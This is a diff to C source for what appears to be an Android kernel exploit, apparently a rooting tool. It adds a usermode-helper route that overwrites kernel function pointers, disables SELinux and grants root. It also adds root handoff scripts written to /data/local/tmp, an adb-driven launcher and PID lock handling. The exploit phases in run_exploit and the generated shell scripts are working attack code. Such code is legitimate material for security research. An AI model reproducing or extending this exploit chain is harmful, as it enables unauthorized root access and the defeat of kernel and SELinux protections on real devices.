@@ -17,6 +17,7 @@
 #include <poll.h>
 
 const struct kernel_offsets *active_offsets = NULL;
+int force_umh_mode;
 
 /* Override target.h _OFF macros with dynamic offsets from offsets.h table */
 #undef SELINUX_ENFORCING_OFF
@@ -358,12 +359,46 @@ static int run_w1_attempt(int attempt) {
  * a completed or failed run in /data/local/tmp. */
 #define BRIDGE_STATE_DIR "/data/adb/anchor"
 #define ROOT_SCRIPT_PATH BRIDGE_STATE_DIR "/bootstrap.sh"
+#define UMH_SCRIPT_PATH "/data/local/tmp/.ghostlock_root.sh"
 #define LATELOAD_DIR "/data/adb/late-load.d"
 #define LATELOAD_RECOVERY_PATH LATELOAD_DIR "/99-anchor-recover.sh"
 #define BOOTSTRAP_LOCK_ENV "ANCHOR_BOOTSTRAP_LOCK_DIR"
 
 static char bootstrap_lock_dir[512];
 static char bootstrap_lock_owner[512];
+
+/* PID values can be reused after an app restart.  Keep the kernel process
+ * start time with the PID so a new anchor process does not inherit a stale
+ * single-flight lock from its predecessor. */
+static int read_proc_starttime(pid_t pid, unsigned long long *starttime) {
+  char path[64];
+  char line[4096];
+  int path_len = snprintf(path, sizeof(path), "/proc/%ld/stat", (long)pid);
+  if (path_len < 0 || (size_t)path_len >= sizeof(path)) return 0;
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) return 0;
+  ssize_t length = read(fd, line, sizeof(line) - 1);
+  close(fd);
+  if (length <= 0) return 0;
+  line[length] = '\0';
+
+  /* comm is parenthesized and may itself contain spaces or ')'. */
+  char *comm_end = strrchr(line, ')');
+  if (!comm_end || comm_end[1] != ' ') return 0;
+  char *save = NULL;
+  char *token = strtok_r(comm_end + 2, " ", &save);
+  for (int field = 3; token && field <= 22; ++field) {
+    if (field == 22) {
+      char *end = NULL;
+      unsigned long long value = strtoull(token, &end, 10);
+      if (end == token || *end != '\0') return 0;
+      *starttime = value;
+      return 1;
+    }
+    token = strtok_r(NULL, " ", &save);
+  }
+  return 0;
+}
 
 static void prepare_bridge_state_dir(void) {
   mkdir("/data/adb", 0700);
@@ -423,7 +458,14 @@ static int create_bootstrap_lock(void) {
     rmdir(bootstrap_lock_dir);
     return 0;
   }
-  dprintf(fd, "%ld\n", (long)getpid());
+  unsigned long long starttime = 0;
+  if (!read_proc_starttime(getpid(), &starttime)) {
+    close(fd);
+    unlink(bootstrap_lock_owner);
+    rmdir(bootstrap_lock_dir);
+    return 0;
+  }
+  dprintf(fd, "%ld %llu\n", (long)getpid(), starttime);
   close(fd);
   return 1;
 }
@@ -438,17 +480,42 @@ static int acquire_bootstrap_lock(void) {
 
   char owner[32] = {0};
   read_first_line(bootstrap_lock_owner, owner, sizeof(owner));
-  long owner_pid = strtol(owner, NULL, 10);
-  if (owner_pid > 0 && kill((pid_t)owner_pid, 0) != 0 && errno == ESRCH) {
+  long owner_pid = 0;
+  unsigned long long owner_starttime = 0;
+  int owner_fields = sscanf(owner, "%ld %llu", &owner_pid, &owner_starttime);
+  int owner_is_stale = 0;
+  if (owner_pid > 0 && owner_starttime > 0) {
+    unsigned long long current_starttime = 0;
+    owner_is_stale = !read_proc_starttime((pid_t)owner_pid, &current_starttime) ||
+                     current_starttime != owner_starttime;
+  } else if (owner_pid == (long)getpid()) {
+    /* Legacy owner files contained only a PID.  This process cannot already
+     * own the lock before acquire_bootstrap_lock() succeeds, so a matching
+     * PID is necessarily a reused PID from a previous invocation. */
+    owner_is_stale = 1;
+  }
+  if (owner_fields > 0 && owner_pid > 0 &&
+      (owner_is_stale || (kill((pid_t)owner_pid, 0) != 0 && errno == ESRCH))) {
     unlink(bootstrap_lock_owner);
     if (rmdir(bootstrap_lock_dir) == 0 && create_bootstrap_lock()) {
-      pr_info("reclaimed dead bootstrap lock pid=%ld\n", owner_pid);
+      pr_info("reclaimed stale bootstrap lock pid=%ld\n", owner_pid);
       return 1;
     }
   }
 
   struct stat st;
   time_t now = time(NULL);
+  /* A torn owner write (for example after a device reset) cannot identify a
+   * live process.  Give a just-created lock a short grace period, then
+   * reclaim malformed owner state instead of blocking every future retry. */
+  if (owner_fields <= 0 && stat(bootstrap_lock_dir, &st) == 0 &&
+      now != (time_t)-1 && now - st.st_mtime > 10) {
+    unlink(bootstrap_lock_owner);
+    if (rmdir(bootstrap_lock_dir) == 0 && create_bootstrap_lock()) {
+      pr_info("reclaimed malformed bootstrap lock\n");
+      return 1;
+    }
+  }
   if (stat(bootstrap_lock_dir, &st) == 0 && now != (time_t)-1 &&
       now - st.st_mtime > 300) {
     unlink(bootstrap_lock_owner);
@@ -541,7 +608,7 @@ static int write_lateload_recovery_script(void) {
     "  \"$KSUD\" resetprop service.adb.tcp.port 5555 >/dev/null 2>&1\n"
     "fi\n"
     "POLICY_RC=127\n"
-    "if command -v load_policy >/dev/null 2>&1; then load_policy /sys/fs/selinux/policy >/dev/null 2>&1; POLICY_RC=$?; fi\n"
+    "# load_policy /sys/fs/selinux/policy  (temporarily disabled)\n"
     "OPTIONS=/data/user/0/com.anchor.bootstrap/no_backup/options.conf\n"
     "if grep -qx 'disable_usb_debugging=1' \"$OPTIONS\" 2>/dev/null; then\n"
     "  settings put global adb_enabled 0 >/dev/null 2>&1\n"
@@ -556,8 +623,9 @@ static int write_lateload_recovery_script(void) {
   return 1;
 }
 
-static int write_root_script(void) {
-  prepare_bridge_state_dir();
+static int write_root_script_at(const char *script_path) {
+  if (strcmp(script_path, ROOT_SCRIPT_PATH) == 0)
+    prepare_bridge_state_dir();
   const char *script =
     "#!/system/bin/sh\n"
     "STATE_DIR=/data/adb/anchor\n"
@@ -621,11 +689,19 @@ static int write_root_script(void) {
     "  state root-unavailable\n"
     "fi\n"
     "exit 0\n";
-  if (!publish_root_script(ROOT_SCRIPT_PATH, script)) {
+  if (!publish_root_script(script_path, script)) {
     pr_error("cannot write root handoff script errno=%d\n", errno);
     return 0;
   }
   return 1;
+}
+
+static int write_root_script(void) {
+  return write_root_script_at(ROOT_SCRIPT_PATH);
+}
+
+static int write_umh_root_script(void) {
+  return write_root_script_at(UMH_SCRIPT_PATH);
 }
 
 /* perf_find_task - only used when perf is available (shell context) */
@@ -827,7 +903,35 @@ int run_exploit(int argc, char **argv) {
 
   /* Phase 1: Disable SELinux */
   int selinux_ok = check_selinux_off();
-  if (!selinux_ok) {
+  int umh_available = active_offsets &&
+      active_offsets->off_system_unbound_wq &&
+      active_offsets->off_call_usermodehelper_exec_work &&
+      active_offsets->off_ashmem_misc_fops;
+  pr_info("UMH policy: available=%d force=%d\n", umh_available, force_umh_mode);
+  if (active_offsets && active_offsets->requires_umh && !umh_available) {
+    pr_error("this OP13 6.6 kernel requires exact UMH offsets; refusing W1/W2 fallback\n");
+    pr_error("re-extract off_system_unbound_wq and off_call_usermodehelper_exec_work for %s\n",
+             active_offsets->uname_r);
+    return 1;
+  }
+  if (umh_available && !write_umh_root_script()) {
+    pr_error("UMH root handoff script unavailable\n");
+    return 1;
+  }
+  if (force_umh_mode && umh_available) {
+    pr_info("UMH path: fops redirect (mode=4)...\n");
+    slab_drain();
+    TIMER("pre-UMH drain");
+    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
+    TIMER("fops redirect done");
+    selinux_ok = check_selinux_off();
+  }
+  if (force_umh_mode && umh_available && !root_child_done) {
+    pr_error("forced UMH failed; refusing W1/W2 fallback\n");
+    cleanup_tmp_compat_files();
+    return 1;
+  }
+  if (!selinux_ok && !root_child_done) {
     /* Match upstream behavior: drain once before the five W1 attempts, not
      * once inside every retry. */
     slab_drain();
@@ -840,8 +944,27 @@ int run_exploit(int argc, char **argv) {
     }
     if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
     TIMER("Write 1 complete");
+  } else if (!selinux_ok && root_child_done) {
+    selinux_ok = 1;
   } else {
     pr_success("SELinux already off\n");
+  }
+
+  if (root_child_done) {
+    pr_success("UMH root done — skipping W2\n");
+    TIMER("exploit complete (UMH)");
+    int su_ready = 0;
+    pr_info("waiting for su...\n");
+    for (int i = 0; i < 60; i++) {
+      if (system("su -c 'id' > /dev/null 2>&1") == 0) {
+        pr_success("su ready, fixing SELinux policy\n");
+        system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
+        su_ready = 1;
+        break;
+      }
+      sleep(1);
+    }
+    return su_ready ? 0 : 1;
   }
 
   /* Phase 2: Find child task_struct + cred overwrite */
@@ -934,6 +1057,7 @@ int run_exploit(int argc, char **argv) {
 int install_embedded_wallpaper(void) { return 0; }
 
 static int run_write1_only(void);
+extern int mini_adb_port;
 extern int mini_adb_shell(const char *cmd);
 
 /* This is overridden by the standalone app build. The official Manager
@@ -956,41 +1080,51 @@ static int run_bootstrap(void) {
   if (!acquire_bootstrap_lock()) return 1;
   int result = 1;
 
-  /* Wait for adb TCP on port 5555 */
-  pr_info("Waiting for adb TCP on port 5555...\n");
+  /* Wait for adb TCP on the configured port. */
+  int adb_port = 5555;
+  char port_buf[32] = {};
+  read_first_line("/data/local/tmp/a/adb_port", port_buf, sizeof(port_buf));
+  if (port_buf[0]) adb_port = atoi(port_buf);
+  if (adb_port <= 0 || adb_port > 65535) adb_port = 5555;
+  pr_info("Waiting for adb TCP on port %d...\n", adb_port);
   for (int i = 0; i < 30; i++) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in addr = {
       .sin_family = AF_INET,
-      .sin_port = htons(5555),
+      .sin_port = htons(adb_port),
       .sin_addr.s_addr = htonl(0x7f000001)
     };
     int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
     if (sock >= 0) close(sock);
     if (c == 0) {
-      pr_success("adbd ready on port 5555 (attempt %d)\n", i + 1);
+      pr_success("adbd ready on port %d (attempt %d)\n", adb_port, i + 1);
       goto tcp_ready;
     }
     usleep(1000000);
   }
-  pr_error("adbd not on TCP 5555 after 30s; run 'adb tcpip 5555' from the PC first\n");
+  pr_error("adbd not on TCP %d after 30s\n", adb_port);
   goto done;
 tcp_ready:
   usleep(200000);
-  pr_info("Connecting via mini-adb...\n");
+  mini_adb_port = adb_port;
+  pr_info("Connecting via mini-adb on port %d...\n", adb_port);
   /* The shell spawned by adbd does not inherit this app process's
    * environment. It can execute a known /data/app path but cannot enumerate
   * that directory, so derive the packaged library path from `pm path`. */
-  int adb_ret = mini_adb_shell(
+  const char *force_arg = env_flag("ANCHOR_FORCE_UMH", 0) ? " --force-umh" : "";
+  char remote_cmd[2048];
+  snprintf(remote_cmd, sizeof(remote_cmd),
     "rm -f /data/local/tmp/.ghostlock_root.sh /data/local/tmp/.ghostlock_w1 "
     "/data/local/tmp/a/ghostlock_postroot.log /data/local/tmp/a/adbkey "
     "/data/local/tmp/a/adbkey.pub /data/local/tmp/a/e; "
     "APK=$(pm path " ANCHOR_BOOTSTRAP_PACKAGE " 2>/dev/null | sed -n 's/^package://p' | head -n 1); "
     "if [ -z \"$APK\" ]; then RC=127; STAGE=apk-not-found; "
-    "else APPBIN=${APK%/base.apk}/lib/arm64/libanchor.so; "
-    "if [ -x \"$APPBIN\" ]; then \"$APPBIN\"; RC=$?; STAGE=anchor-exited; "
+    "else APPBIN=${APK%%/base.apk}/lib/arm64/libanchor.so; "
+    "if [ -x \"$APPBIN\" ]; then \"$APPBIN\"%s; RC=$?; STAGE=anchor-exited; "
     "else RC=126; STAGE=appbin-not-executable; fi; fi; "
-    "printf '\\n__ANCHOR_STAGE=%s\\n__ANCHOR_RC=%s\\n' \"$STAGE\" \"$RC\"; exit \"$RC\"");
+    "printf '\\n__ANCHOR_STAGE=%%s\\n__ANCHOR_RC=%%s\\n' \"$STAGE\" \"$RC\"; exit \"$RC\"",
+    force_arg);
+  int adb_ret = mini_adb_shell(remote_cmd);
   pr_info("mini-adb returned %d\n", adb_ret);
   result = adb_ret;
 done:
@@ -1029,6 +1163,9 @@ static int run_write1_only(void) {
 }
 
 int main(int argc, char **argv) {
+    handle_umh_mode(argc, argv);
+    if (argc > 1 && strcmp(argv[1], "--force-umh") == 0)
+        force_umh_mode = 1;
     if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
         return run_bootstrap();
     if (argc > 1 && strcmp(argv[1], "--write1") == 0)
